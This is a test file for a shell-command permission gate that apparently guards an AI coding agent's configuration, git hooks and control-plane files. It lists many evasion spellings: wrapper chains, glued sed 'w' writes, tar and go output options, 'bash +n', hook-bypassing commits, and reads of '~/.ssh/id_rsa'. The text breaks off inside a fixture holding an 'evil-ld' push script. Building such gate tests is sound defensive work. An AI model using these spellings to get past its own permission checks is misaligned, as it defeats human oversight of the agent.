// CLOSURE OF THE CARRIER AND OPTION FINDINGS (independent review 11, closure audit wave 3).
//
// Three causes, each of which an earlier fix had closed at ONE spelling and left its neighbours open. The tests name the CAUSE, not
// the spelling: the spellings are the reviews', the statement is what must stay true.
//   RC-CAR  a carrier (timeout, env, find -exec, watch, yarn exec...) is peeled by exactly its OWN options, in every spelling, by ONE
//           reader - so the command it carries is found, and what that command writes or was given is seen wherever it stands;
//   RC-OPT  a tool's options are read by the parser the tool has - clusters, glued values, `-o=file`, any unique prefix of a long
//           option, `+n` - and by nothing else; a sed script is read as a script, so a file glued to `w` is a write;
//   RC-WRT  what a modelled tool WRITES is a column of its table, not a regex: `git checkout-index --prefix=`, `tar --extr -C`,
//           `go build -o=`, `sort --o=`, `gcc -MF` and the rest all name a file, and the file is judged.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { ctx, table, workspace, verdict } from './support/corpus.ts';
import { evaluate } from '../src/authority/evaluate.ts';
import { peelCarriers } from '../src/authority/carriers.ts';
import { has, isOn, parseOptions, valuesOf } from '../src/authority/options.ts';
import { scanSedScript } from '../src/authority/sed.ts';
import { SHELL_GRAMMAR, expandLongOptions, sedProgram, shellSyntaxOnly, toolEffects } from '../src/authority/tools.ts';

const words = (s: string): string[] => s.split(/\s+/).filter(Boolean);

// ------------------------------------------------------------------------------------------------------------------------------
// RC-CAR
// ------------------------------------------------------------------------------------------------------------------------------

test('the carrier table finds the carried command: each wrapper by exactly its own options, in every spelling', () => {
  const head = (line: string): string | undefined => {
    const w = words(line);
    return w[peelCarriers(w, 0, { prefixes: new Set(['if', 'then', '!']) }).at];
  };
  for (const [line, expected] of [
    // timeout: a value-taking -s / -k in four spellings, a flag cluster whose last letter takes the value, and the duration
    ['timeout -s KILL 5 sed -n x', 'sed'],
    ['timeout -sKILL 5 sed', 'sed'],
    ['timeout --signal KILL 5 sed', 'sed'],
    ['timeout --signal=KILL 5 sed', 'sed'],
    ['timeout --sig KILL 5 sed', 'sed'],
    ['timeout -k 3 5 sed', 'sed'],
    ['timeout -k3 5 sed', 'sed'],
    ['timeout --kill-after=3 5 sed', 'sed'],
    ['timeout --kill 3 5 sed', 'sed'],
    ['timeout --foreground 5 sed', 'sed'],
    ['timeout -fs KILL 5 sed', 'sed'],
    ['timeout -- 5 sed', 'sed'],
    ['gtimeout -s KILL 5 sed', 'sed'],
    // env: -u / -C / -a in a cluster, glued, abbreviated, and with the signal options that carry an optional value
    ['env --unset A sed', 'sed'],
    ['env --unset=A sed', 'sed'],
    ['env --uns A sed', 'sed'],
    ['env -u A sed', 'sed'],
    ['env -uA sed', 'sed'],
    ['env -iu A sed', 'sed'],
    ['env -iuA sed', 'sed'],
    ['env -C . sed', 'sed'],
    ['env -C. sed', 'sed'],
    ['env --chdir=. sed', 'sed'],
    ['env --chd . sed', 'sed'],
    ['env -a x sed', 'sed'],
    ['env --argv0=x sed', 'sed'],
    ['env --block-signal=INT sed', 'sed'],
    ['env --default-signal sed', 'sed'],
    ['env -0 -v sed', 'sed'],
    ['env - A=1 sed', 'sed'],
    ['env -i A=1 B=2 sed', 'sed'],
    ['env -u A -- B=1 sed', 'sed'],
    ['/usr/bin/env -u A sed', 'sed'],
    // the rest
    ['nice -n 5 sed', 'sed'],
    ['nice -n5 sed', 'sed'],
    ['nice -5 sed', 'sed'],
    ['nice --adjustment=5 sed', 'sed'],
    ['nice --adj 5 sed', 'sed'],
    ['nohup sed', 'sed'],
    ['stdbuf -oL sed', 'sed'],
    ['stdbuf -o L -e0 sed', 'sed'],
    ['stdbuf --output=L sed', 'sed'],
    ['time -p sed', 'sed'],
    ['time -f %e sed', 'sed'],
    ['command -p sed', 'sed'],
    ['exec -a x sed', 'sed'],
    ['exec -c -a x sed', 'sed'],
    ['watch -x sed', 'sed'],
    ['flock /tmp/l sed', 'sed'],
    ['flock -w 5 /tmp/l sed', 'sed'],
    ['flock -n -E 3 /tmp/l sed', 'sed'],
    ['sudo -u root sed', 'sed'],
    ['sudo -p prompt sed', 'sed'],
    ['sudo -pprompt sed', 'sed'],
    ['sudo -D . -H sed', 'sed'],
    ['sudo -u root FOO=1 sed', 'sed'],
    ['yarn exec sed', 'sed'],
    ['pnpm exec sed', 'sed'],
    ['npm exec -- sed', 'sed'],
    ['npx --no-install sed', 'sed'],
    ['bunx sed', 'sed'],
    ['bun x sed', 'sed'],
    ['ionice -c 3 sed', 'sed'],
    ['setsid -w sed', 'sed'],
    // a chain is peeled to a fixed point
    ['nohup nice -n 5 timeout -s KILL 5 env -iu A sed', 'sed'],
    ['timeout 5 timeout --signal=KILL 3 env -i FOO=1 sed -n', 'sed'],
    ['if timeout 5 sed', 'sed'],
    ['! env -u A sed', 'sed'],
  ] as const)
    assert.equal(head(line), expected, line);
});

test('a command STRING a carrier hands to a shell is a string, with the words the carrier appends to it', () => {
  // env appends its remaining arguments to what -S split: `-n` belongs to the commit
  assert.deepEqual(peelCarriers(['env', '-S', 'git commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  assert.deepEqual(peelCarriers(['env', '-Sgit commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  assert.deepEqual(peelCarriers(['env', '-iSgit commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  assert.deepEqual(peelCarriers(['env', '--split-string=git commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  assert.deepEqual(peelCarriers(['env', '--spl=git commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  assert.deepEqual(peelCarriers(['env', '-u', 'A', '-S', 'git commit -m x', '-n'], 0).strings, [{ carrier: 'env', body: 'git commit -m x', appended: ['-n'] }]);
  // the others hand over the string and nothing else
  assert.equal(peelCarriers(['flock', '/tmp/l', '-c', 'git commit -nm x'], 0).strings[0]?.body, 'git commit -nm x');
  assert.equal(peelCarriers(['su', '-', 'root', '-c', 'git commit -nm x'], 0).strings[0]?.body, 'git commit -nm x');
  assert.equal(peelCarriers(['su', '--session-command=git commit -nm x', 'root'], 0).strings[0]?.body, 'git commit -nm x');
  assert.equal(peelCarriers(['runuser', '-u', 'root', '-c', 'git commit -nm x'], 0).strings[0]?.body, 'git commit -nm x');
  // watch's argument is ONE shell string unless -x asks for an exec
  assert.equal(peelCarriers(['watch', '-n', '5', 'git commit -nm x'], 0).shellString, 'git commit -nm x');
  assert.equal(peelCarriers(['watch', '-d', 'git', 'commit', '-nm', 'x'], 0).shellString, 'git commit -nm x');
  assert.equal(peelCarriers(['watch', '-x', 'git', 'commit'], 0).shellString, null);
  assert.equal(peelCarriers(['watch', 'ls'], 0).shellString, 'ls');
});

test('an own option the table does not know, or a chain past the depth cap, leaves the carried command UNLOCATED', () => {
  for (const line of ['timeout --future-flag 5 sed', 'env --future sed', 'sudo --future-opt sed', 'nice --future sed', 'time --future sed'])
    assert.notEqual(peelCarriers(words(line), 0).partial, null, line);
  // a lenient carrier (an option set the table lists in part) reads an unknown option as a flag, as the old loop did
  assert.equal(peelCarriers(words('chrt --future 10 sed'), 0).partial, null);
  assert.notEqual(peelCarriers([...Array(14).fill('nohup'), 'sed'], 0).partial, null);
  assert.equal(peelCarriers([...Array(6).fill('nohup'), 'sed'], 0).partial, null);
  const dir = workspace({ 'README.md': 'x\n' });
  assert.equal(verdict('timeout --future-flag 5 sed -n 1p README.md', dir), 'ASK');
  assert.equal(verdict('env --future sed -n 1p README.md', dir), 'ASK');
  assert.equal(verdict(`${'nohup '.repeat(14)}sed -n 1p README.md`, dir), 'ASK');
  assert.equal(verdict(`${'nohup '.repeat(6)}sed -n 1p README.md`, dir), 'ALLOW');
});

/** the effects a carrier must not hide, each DENY on its own: a write into the agent's configuration (sed's `w`), a hook-bypassing commit,
 *  and a restore of a control-plane file from another directory */
const EFFECTS = [
  "sed -n '1w .claude/settings.json' README.md",
  'git commit -nm x',
  'git -C control-plane checkout HEAD~1 permissions/matchers.md',
];
const FIXTURE = {
  '.claude/settings.json': '{}',
  'README.md': 'base\n',
  'control-plane/permissions/matchers.md': 'v2\n',
};
/** the same carriers in front of something harmless: nothing is gated for being carried */
const BENIGN = ["sed -n 1p README.md", 'git status', 'git -C control-plane log -1 --oneline'];

const ARGV_CARRIERS = [
  'timeout 5',
  'timeout -s KILL 5',
  'timeout -sKILL 5',
  'timeout --signal KILL 5',
  'timeout --signal=KILL 5',
  'timeout --sig=KILL 5',
  'timeout -k 3 5',
  'timeout -k3 5',
  'timeout --kill-after=3 5',
  'timeout --kill 3 5',
  'timeout --foreground 5',
  'timeout -fs KILL 5',
  'gtimeout -s KILL 5',
  'env',
  'env -u A',
  'env -uA',
  'env --unset A',
  'env --unset=A',
  'env --uns A',
  'env -iu A',
  'env -iuA',
  'env -a x',
  'env --argv0=x',
  'env --block-signal=INT',
  'env -0',
  'env -i A=1',
  'env - A=1',
  'env -u A -- B=1',
  '/usr/bin/env -u A',
  'nice',
  'nice -n 5',
  'nice -n5',
  'nice -5',
  'nice --adjustment=5',
  'nohup',
  'stdbuf -oL',
  'stdbuf -o L -e0',
  'stdbuf --output=L',
  'time',
  'time -p',
  'command',
  'command -p',
  'exec -a x',
  'exec -c -a x',
  'setsid',
  'setsid -w',
  'ionice -c 3',
  'ionice -c3 -n 7',
  'caffeinate -i',
  'flock /tmp/l',
  'flock -n /tmp/l',
  'flock -w 5 /tmp/l',
  'flock -n -E 3 /tmp/l',
  'yarn exec',
  'pnpm exec',
  'npx',
  'npx --no-install',
  'npm exec --',
  'bunx',
  'bun x',
  'watch -x',
  'sudo -u root',
  'sudo -p prompt',
  'sudo -pprompt',
  'sudo -n',
  'nohup nice -n 5 timeout -s KILL 5 env -iu A',
  'timeout 5 timeout --signal=KILL 3 env -i FOO=1',
  'env -u A timeout -k3 5 nice -5 stdbuf -oL',
];

test('RC-CAR: no carrier, in any spelling of its own options, hides the command it carries from the readers of the line as written', () => {
  const dir = workspace(FIXTURE);
  for (const carrier of ARGV_CARRIERS)
    for (const effect of EFFECTS) assert.equal(verdict(`${carrier} ${effect}`, dir), 'DENY', `${carrier} ${effect}`);
});

test('RC-CAR: ...and a carrier in front of something harmless gates nothing that the bare command does not', () => {
  const dir = workspace(FIXTURE);
  // (sudo asks on its own account, which is not what is under test)
  for (const carrier of ARGV_CARRIERS.filter((c) => !c.startsWith('sudo') && !/^(npx|bunx|bun x|pnpm exec|yarn exec|npm exec)/.test(c)))
    for (const benign of BENIGN) assert.equal(verdict(`${carrier} ${benign}`, dir), 'ALLOW', `${carrier} ${benign}`);
  // a shell keyword may stand between carriers: `time` is a carrier with options of its own and also the keyword in front of a pipeline
  for (const c of ['time ! false', 'time if true; then ls; fi', 'time -p ls', 'time FOO=1 make --version']) assert.equal(verdict(c, dir), 'ALLOW', c);
  for (const carrier of ['yarn exec', 'pnpm exec', 'npx', 'npm exec --'])
    for (const benign of ['git status', "sed -n 1p README.md"]) assert.notEqual(verdict(`${carrier} ${benign}`, dir), 'DENY', `${carrier} ${benign}`);
});

test('RC-CAR: a command a carrier RUNS BY PAYLOAD or by STRING is a carried command like sh -c', () => {
  const dir = workspace(FIXTURE);
  for (const effect of EFFECTS) {
    for (const wrap of [
      (e: string) => `find . -maxdepth 0 -exec ${e} \\;`,
      (e: string) => `find . -maxdepth 0 -execdir ${e} \\;`,
      (e: string) => `find . -maxdepth 0 -ok ${e} \\;`,
      (e: string) => `find . -maxdepth 0 -exec timeout -s KILL 5 ${e} \\;`,
      (e: string) => `find . -maxdepth 0 -exec env -u A ${e} \\;`,
      (e: string) => `find . -maxdepth 0 -exec nice -n 5 ${e} \\;`,
      (e: string) => `fd -x ${e}`,
      (e: string) => `watch '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `watch -n 5 '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `timeout 5 watch '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `sem '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `flock /tmp/l -c '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `su -c '${e.replace(/'/g, `'\\''`)}' root`,
      (e: string) => `bash -c '${e.replace(/'/g, `'\\''`)}'`,
      (e: string) => `xargs -n1 ${e}`,
    ])
      assert.equal(verdict(wrap(effect), dir), 'DENY', wrap(effect));
  }
  // the carried command is judged ONCE it is found: a harmless one stays harmless
  for (const c of ["find . -maxdepth 0 -exec sed -n 1p README.md \\;", "watch -n 5 'git status'", 'find . -name x -execdir ls {} \\;', "fd -x echo {}"])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('RC-CAR: env appends its remaining arguments to the string -S split, so a hook bypass after it is a hook bypass', () => {
  const dir = workspace();
  for (const c of [
    "env -S'git commit -m x' -n",
    "env -S 'git commit -m x' -n",
    'env -S "git commit" -m x -n',
    "env --split-string='git commit -m x' -n",
    "env --spl='git commit -m x' -n",
    "env -iS'git commit -m x' -n",
    "env -u A -S'git commit -m x' -n",
    "env -S'git commit -m x' -nm y",
    "env -S'git commit' -m x -n",
    "env -S'git commit' -m x --no-verify",
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // ...and the same string with a harmless remainder is not
  for (const c of ["env -S'git commit -m x'", "env -S'git commit' -m x", "env -S'git status' -s"]) assert.notEqual(verdict(c, dir), 'DENY', c);
  // ...and a `-n` that is part of a MESSAGE is not the flag, however many carriers the message passes through
  for (const c of [
    "env -S'git commit' -m 'fix -n'",
    "env -S 'git commit -m \"fix -n\"'",
    "watch 'git commit -m \"fix -n\"'",
    "timeout -s KILL 5 git commit -m 'fix -n'",
    "find . -maxdepth 0 -exec git commit -m 'fix -n' \\;",
  ])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('RC-CAR: the directory a carrier chain runs in is read by the same reader, whatever options stand in front of git -C', () => {
  const dir = workspace(FIXTURE);
  const co = 'git -C control-plane checkout HEAD~1 permissions/matchers.md';
  for (const c of [
    `yarn exec ${co}`,
    `pnpm exec ${co}`,
    `npm exec -- ${co}`,
    `npx --no-install ${co}`,
    `bunx ${co}`,
    `timeout -s KILL 5 ${co}`,
    `env --unset A ${co}`,
    `env -iu A ${co}`,
    `nice -5 ${co}`,
    `stdbuf -o L ${co}`,
    `env -C control-plane git checkout HEAD~1 permissions/matchers.md`,
    `env --chdir=control-plane git checkout HEAD~1 permissions/matchers.md`,
    `env -iC control-plane git checkout HEAD~1 permissions/matchers.md`,
    `env -u A -C control-plane git checkout HEAD~1 permissions/matchers.md`,
    `timeout -s KILL 5 env -C control-plane git checkout HEAD~1 permissions/matchers.md`,
    `find . -maxdepth 0 -exec ${co} \\;`,
    `find . -maxdepth 0 -exec env -C control-plane git checkout HEAD~1 permissions/matchers.md \\;`,
    `fd -x ${co}`,
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
});

// ------------------------------------------------------------------------------------------------------------------------------
// RC-OPT
// ------------------------------------------------------------------------------------------------------------------------------

test('the option parser reads clusters, glued values, unique prefixes and the inverse flag the way the tools do', () => {
  // a cluster whose last letter takes a value: the value is the next word, or the rest of the word
  const t = parseOptions(SHELL_GRAMMAR, ['-euxo', 'pipefail', '-c', 'body'], 0);
  assert.deepEqual(t.options.map((o) => `${o.name}${o.value ? '=' + o.value : ''}`), ['e', 'u', 'x', 'o=pipefail', 'c']);
  assert.equal(t.end, 3);
  // `+n` turns a flag back off: the LAST of -n / +n decides
  assert.equal(shellSyntaxOnly(words('bash -n +n -c x'), 1), false);
  assert.equal(shellSyntaxOnly(words('bash +n -n -c x'), 1), true);
  assert.equal(shellSyntaxOnly(words('bash -nx +n -c x'), 1), false);
  assert.equal(shellSyntaxOnly(words('bash -o noexec -c x'), 1), true);
  assert.equal(shellSyntaxOnly(words('bash -n +o noexec -c x'), 1), false);
  assert.equal(shellSyntaxOnly(words('bash --noexec +n -c x'), 1), false);
  // an option belongs to the shell only until the first operand
  assert.equal(shellSyntaxOnly(words('bash script.sh -n'), 1), false);
  assert.equal(shellSyntaxOnly(words('bash -n script.sh -n'), 1), true);
  // a long option is any unique prefix of a name; an ambiguous one answers for every candidate (and resolves to none)
  const tar = toolEffects('tar', words('tar --extr -f x.tar'))!;
  assert.ok(has(tar.parsed, 'extract'));
  assert.ok(has(toolEffects('tar', words('tar --get -f x.tar'))!.parsed, 'extract'));
  const ambiguous = toolEffects('tar', words('tar --e -f x.tar'))!.parsed.options[0]!;
  assert.ok(ambiguous.candidates && ambiguous.candidates.includes('extract') && ambiguous.candidates.includes('exclude'));
  // a single dash in front of a whole word is a Go option; a compiler reads -ofile and -o file alike
  assert.deepEqual(valuesOf(toolEffects('go', words('go build -o=a -o b'))!.parsed, 'o'), ['a', 'b']);
  assert.deepEqual(valuesOf(toolEffects('gcc', words('gcc -ofile -o file2 -MFx.d'))!.parsed, 'o'), ['file', 'file2']);
  assert.equal(isOn(parseOptions(SHELL_GRAMMAR, words('-n +n'), 0), 'n'), false);
});

test('RC-OPT: tar abbreviations, clusters and the traditional spelling are one reading, for the mode, the archive, the directory and the program', () => {
  const dir = workspace({ 'x.tar': 'x', src: '' });
  // the extraction lands in a git hook directory in every spelling of the mode and of the directory option
  for (const c of [
    'tar --extr -f x.tar -C .git/hooks',
    'tar --ext -f x.tar -C .git/hooks',
    'tar --get -f x.tar -C .git/hooks',
    'tar --extract -f x.tar --directory=.git/hooks',
    'tar --extract -f x.tar --direct=.git/hooks',
    'tar --extract -f x.tar --dir .git/hooks',
    'tar -x -f x.tar --one-top=.git/hooks',
    'tar -xvf x.tar -C .git/hooks',
    'tar -xvf x.tar -C.git/hooks',
    'tar xvf x.tar -C .git/hooks',
    'tar xvfC x.tar .git/hooks',
    'tar -C .git -C hooks -xf x.tar',
    'tar -C .git/hooks -x -f x.tar',
    // a letter the table does not know is a flag the parser reports, and the mode behind it is still read
    'tar -Exf x.tar -C .git/hooks',
    'tar -qxf x.tar -C .git/hooks',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // ...and the archive WRITTEN is a write to that path in every mode that writes one (including --delete, which had no spelling at all)
  for (const c of [
    'tar --cre -f .git/hooks/pre-commit src',
    'tar --create -f .git/hooks/pre-commit src',
    'tar --appe -f .git/hooks/pre-commit src',
    'tar --upd -f .git/hooks/pre-commit src',
    'tar --catenate -f .git/hooks/pre-commit x.tar',
    'tar --delete -f .git/hooks/pre-commit x',
    'tar -cf .git/hooks/pre-commit src',
    'tar -czf .git/hooks/pre-commit src',
    'tar cf .git/hooks/pre-commit src',
    'tar cbf 20 .git/hooks/pre-commit src',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // a listing, a comparison and an extraction to standard output write nothing
  for (const c of ['tar -tf x.tar', 'tar --list -f x.tar', 'tar -xOf x.tar file', 'tar --to-stdout -xf x.tar file', 'tar -cf out.tar src', 'tar -czf out.tgz src'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  // a program the options name is run, whatever the abbreviation of the option
  for (const c of [
    'tar -cf x.tar --use=./tcomp.sh src',
    'tar -cf x.tar --use-c=./tcomp.sh src',
    'tar -cf x.tar --use-compress-p=./tcomp.sh src',
    'tar -cf x.tar -I ./tcomp.sh src',
    'tar -cf x.tar -I./tcomp.sh src',
    'tar -xf x.tar --use ./tcomp.sh',
    'tar -cf x.tar --checkpoint=1 --checkpoint-a=exec=./x.sh src',
    'tar -cf x.tar --to-c=./x src',
    'tar -cMf x.tar --info-script=./x.sh src',
    'tar -cMf x.tar --new-volume-script=./x.sh src',
    'tar -cf x.tar -F ./x.sh src',
    'tar -xf x.tar --rmt-command=./x',
    'sort --comp=./comp.sh -S 100 big.txt',
    'sort --compress-prog=sh a',
    'sort --compress-program=./c a',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // --remove-files deletes what it archived
  assert.notEqual(verdict('tar -cf x.tar --rem src', dir), 'ALLOW');
  assert.notEqual(verdict('tar -cf x.tar --remove-files src', dir), 'ALLOW');
  // tar's abbreviations are rewritten for the text matchers, and an ambiguous one is left alone
  assert.deepEqual(expandLongOptions(words('tar -cf x --use=./c --rem src')), ['tar', '-cf', 'x', '--use-compress-program=./c', '--remove-files', 'src']);
  assert.deepEqual(expandLongOptions(words('tar --e -f x')), ['tar', '--e', '-f', 'x']);
});

test('RC-OPT: a sed script is read as a script - the file may be glued to the command letter, and to the flag of s', () => {
  const dir = workspace({ 'f': 'l\n', '.claude/settings.json': '{}', '.env': 'A=1\n', 'src/a.ts': 'x\n', 's.sed': 'w.claude/settings.json\n', 'control-plane/permissions/grants.md': 'x\n' });
  for (const c of [
    "sed -n 'w.claude/settings.json' f",
    "sed -n '1w.claude/settings.json' f",
    "sed -n '/x/w.claude/settings.json' f",
    "sed -n '$w.claude/settings.json' f",
    "sed -n '2,3w.claude/settings.json' f",
    "sed -n '/a/,/b/w.claude/settings.json' f",
    "sed -n '1!w.claude/settings.json' f",
    "sed -n -e'w.claude/settings.json' f",
    "sed -n -e 'w.claude/settings.json' f",
    'sed --expression=w.claude/settings.json f',
    'sed --expr=w.claude/settings.json f',
    'sed --expression w.claude/settings.json f',
    "sed -e 'p;w.claude/settings.json' f",
    "sed -n '1{w.claude/settings.json\n}' f",
    "sed -n 'p\nw.claude/settings.json' f",
    "sed -s -n 'W.claude/settings.json' f",
    "sed 's/x/y/w.claude/settings.json' f",
    "sed 's/x/y/gw.claude/settings.json' f",
    "sed 's/x/y/w .claude/settings.json' f",
    "sed 's|x|y|w.claude/settings.json' f",
    "sed -n 'y/a/b/;w.claude/settings.json' f",
    "gsed -n 'w.claude/settings.json' f",
    'sed w.env src/a.ts',
    'sed s/a/b/w.git/config src/a.ts',
    'sed wcontrol-plane/permissions/grants.md src/a.ts',
    'sed -e w.env src/a.ts',
    "gsed 's/a/b/w.env' f",
    // the script in a FILE, with the file given in any spelling of -f
    'sed -f s.sed f',
    'sed -fs.sed f',
    'sed -nf s.sed f',
    'sed --file=s.sed f',
    'sed --fi s.sed f',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // what the script merely READS or PRINTS is not a write; `r` reads a file into the output and is judged as a read
  for (const c of ["sed -n 1p f", "sed -n '1w out.txt' f", "sed 's/a;w x/b/' f", "sed 's/w.env/x/' f", "sed -n 'y/w/x/' f", 'sed -i s/a/b/ src/a.ts'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  assert.equal(verdict("sed 'r ~/.ssh/id_rsa' f", dir), 'DENY');
  assert.notEqual(verdict("sed 'r/etc/passwd' f", dir), 'ALLOW');
});

test('the sed script scanner finds the four commands that touch the world, by the grammar of the script', () => {
  const eff = (script: string) => scanSedScript(script);
  assert.deepEqual(eff('w.env').writes, ['.env']);
  assert.deepEqual(eff('1,3w .env').writes, ['.env']);
  assert.deepEqual(eff('$!w .env').writes, ['.env']);
  assert.deepEqual(eff('s/a/b/gw.env').writes, ['.env']);
  assert.deepEqual(eff('s/a/b/gw .env').writes, ['.env']);
  assert.deepEqual(eff('1{w.env\n}').writes, ['.env']);
  assert.deepEqual(eff('p;w.env').writes, ['.env']);
  assert.deepEqual(eff('W.env').writes, ['.env']);
  assert.deepEqual(eff('/x/I,+2 w.env').writes, ['.env']);
  // a name runs to the end of the line, and a portable script means the part before the `;`: both are reported
  assert.deepEqual(eff('w out.txt;p').writes.sort(), ['out.txt', 'out.txt;p']);
  // text of a/i/c, a comment, a regex, a replacement and a label are not commands
  assert.deepEqual(eff('a\\\nw x\nw y').writes, ['y']);
  assert.deepEqual(eff('p # w x\nw z').writes, ['z']);
  assert.deepEqual(eff('s/a;w x/b/').writes, []);
  assert.deepEqual(eff('s/a/b;w x/').writes, []);
  assert.deepEqual(eff('/w x/p').writes, []);
  assert.deepEqual(eff(':w\nbw').writes, []);
  assert.deepEqual(eff('r /etc/passwd').reads, ['/etc/passwd']);
  assert.deepEqual(eff('1e git push origin main').commands, ['git push origin main']);
  assert.equal(eff('s/x/y/e').executesPatternSpace, true);
  assert.equal(eff('e').executesPatternSpace, true);
  // the options around the script
  assert.deepEqual(sedProgram(words('sed --expr=w.env f'), 1).scripts, ['w.env']);
  assert.deepEqual(sedProgram(words('sed -ne p -e w.x f'), 1).scripts, ['p', 'w.x']);
  assert.deepEqual(sedProgram(words('sed -nf s.sed f'), 1).scriptFiles, ['s.sed']);
  assert.deepEqual(sedProgram(words('sed -nf s.sed f'), 1).files, ['f']);
  assert.equal(sedProgram(words('sed -in s/a/b/ f'), 1).inPlace, true);
});

test('RC-OPT: a shell\'s +n turns the syntax check back off, so the body is RUN', () => {
  const dir = workspace();
  for (const c of [
    "bash -n +n -c 'git push origin main'",
    "sh -n +n -c 'git push origin main'",
    "zsh -n +n -c 'git push origin main'",
    "bash -nv +n -c 'git push origin main'",
    "bash -n +o noexec -c 'git push origin main'",
    "bash -o noexec +n -c 'git push origin main'",
    "bash --noexec +n -c 'git push origin main'",
    "bash +n -c 'git push origin main'",
    "bash +e -c 'git push origin main'",
    "bash -n -c 'echo hi' && bash +n -c 'git push origin main'",
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  assert.notEqual(verdict("bash -n +n -c 'rm -rf /tmp/x'", dir), 'ALLOW');
  // a syntax check that stays a syntax check reads the body and runs nothing - including when the last of the toggles turns it on
  for (const c of ["bash -n -c 'git push origin main'", "bash +n -n -c 'git push origin main'", "sh -n -c 'rm -rf /tmp/x'", "bash -n -o pipefail -c 'rm -rf /tmp/x'", 'bash -n script.sh'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('RC-OPT: a Go tool reads -o=PATH, -o PATH and --o=PATH as the same destination; a compiler reads -o=PATH as a file called =PATH, so both are judged', () => {
  const dir = workspace({ 'go.mod': 'module a\ngo 1.22\n', 'cmd/hook/main.go': 'package main\nfunc main(){}\n', 'a.c': 'int main(){}' });
  for (const c of [
    'go build -o=.git/hooks/pre-commit ./cmd/hook',
    'go build -o .git/hooks/pre-commit ./cmd/hook',
    'go build --o=.git/hooks/pre-commit ./cmd/hook',
    'go build -ldflags=-s -o=.git/hooks/pre-commit ./cmd/hook',
    'go build -o=control-plane/permissions/matchers.md ./cmd/hook',
    'go build -o=.harness/runtime/pin.json ./cmd/hook',
    'go test -c -o=.git/hooks/pre-commit ./cmd/hook',
    'go test -coverprofile=.git/hooks/pre-commit ./...',
    'go test -cpuprofile=.git/hooks/pre-commit ./...',
    'go test -trace=.git/hooks/pre-commit ./...',
    'go install -o=.git/hooks/pre-commit ./cmd/hook',
    'gcc -o=.git/hooks/pre-commit a.c',
    'gcc -o.git/hooks/pre-commit a.c',
    'gcc -MF.git/hooks/pre-commit -MD -c a.c',
    'gcc -MF .git/hooks/pre-commit -MD -c a.c',
    'gcc -MJ.git/hooks/pre-commit -c a.c',
    'sort --o=.git/hooks/pre-commit src/a.ts',
    'sort -o.git/hooks/pre-commit src/a.ts',
    'sort -o .git/hooks/pre-commit src/a.ts',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  for (const c of ['go build -o=bin/app ./cmd/hook', 'go build ./...', 'gcc a.c -o a.out', 'gcc -MF a.d -MD -c a.c', 'sort -o sorted.txt a.c'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  const goW = toolEffects('go', words('go build -o=x -args -o y'))!;
  assert.deepEqual(goW.writes, ['x']);
  assert.deepEqual(toolEffects('gcc', words('gcc -o=x a.c'))!.writes.sort(), ['=x', 'x']);
});

// ------------------------------------------------------------------------------------------------------------------------------
// RC-WRT
// ------------------------------------------------------------------------------------------------------------------------------

test('RC-WRT: what git writes to the file system is a column of its table - checkout-index --prefix, archive, bundle, format-patch, --output', () => {
  const dir = workspace({ 'control-plane/permissions/matchers.md': 'x\n' });
  for (const c of [
    'git checkout-index -a --prefix=.git/hooks/',
    'git checkout-index --prefix=.git/hooks/ pre-commit',
    'git checkout-index -a --pref=.git/hooks/',
    'git checkout-index -a --prefix .git/hooks/',
    'git checkout-index -f --prefix=.git/hooks/ -- pre-commit',
    'git checkout-index -a --prefix=control-plane/',
    'git checkout-index --prefix=control-plane/ permissions/matchers.md',
    'git checkout-index -f control-plane/permissions/matchers.md',
    'git archive -o .git/hooks/x.tar HEAD',
    'git archive --output=.git/hooks/x.tar HEAD',
    'git archive --out=.git/hooks/x.tar HEAD',
    'git archive HEAD -o .git/hooks/x.tar',
    'git bundle create .git/hooks/pre-commit HEAD',
    'git format-patch -o .git/hooks -1',
    'git format-patch --output-directory=control-plane -1',
    'git format-patch --output-directory control-plane -3',
    'git diff --output=.git/hooks/pre-commit',
    'git log --output=.git/hooks/pre-commit',
    'git show --output=.git/hooks/pre-commit HEAD',
    'git clone --separate-git-dir=.git/hooks/x https://example.test/r.git d',
    'git config --file .git/hooks/x user.name y',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  // writing OUTSIDE the governed trees is the ordinary work it was
  for (const c of ['git checkout-index --prefix=/tmp/export/ -a', 'git archive -o /tmp/x.tar HEAD', 'git format-patch -o /tmp/patches -1', 'git config --file /tmp/x --get user.name', 'git bundle create /tmp/x.bundle HEAD'])
    assert.notEqual(verdict(c, dir), 'DENY', c);
});

// ------------------------------------------------------------------------------------------------------------------------------
// the runners the bounded vocabulary trusts: an option that NAMES what they load is something they were named for
// ------------------------------------------------------------------------------------------------------------------------------

test('a bounded runner or compiler is bounded only while its options name nothing it would load: a linker, a formatter, a parser, a plugin, a configuration, an init hook, a module beside it', () => {
  const dir = workspace({
    'evil-ld': '#!/bin/sh\ngit push --force origin main\n',
    'a.c': 'int main(){}',
    'fmt.js': 'require("child_process").execSync("git push origin main")',
    'par.js': 'x',
    'a.js': 'x',
    'x.py': 'pass',
